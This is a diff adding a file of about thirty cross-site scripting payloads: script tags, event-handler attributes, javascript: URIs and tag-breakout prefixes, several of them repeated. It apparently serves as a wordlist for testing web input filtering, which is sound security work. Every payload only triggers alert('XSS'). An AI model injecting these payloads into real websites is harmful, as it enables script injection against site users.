@@ -1,0 +1,30 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<a href="javascript:alert('XSS')">Click me</a>
+<svg onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+<marquee onstart=alert('XSS')>XSS</marquee>
+<body onload=alert('XSS')>
+<input value="<script>alert('XSS')</script>">
+<object data="javascript:alert('XSS')"></object>
+<embed src="javascript:alert('XSS')">
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><iframe src="javascript:alert('XSS')">
+"><body onload=alert('XSS')>
+"><input value="<script>alert('XSS')</script>">
+"><object data="javascript:alert('XSS')">
+"><embed src="javascript:alert('XSS')">
+"><a href="javascript:alert('XSS')">Click me</a>
+</textarea><script>alert('XSS')</script>
+</style><script>alert('XSS')</script>
+</title><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><iframe src="javascript:alert('XSS')">
+"><body onload=alert('XSS')>
+"><input value="<script>alert('XSS')</script>">
+"><object data="javascript:alert('XSS')">
+"><embed src="javascript:alert('XSS')">
+"><a href="javascript:alert('XSS')">Click me</a>
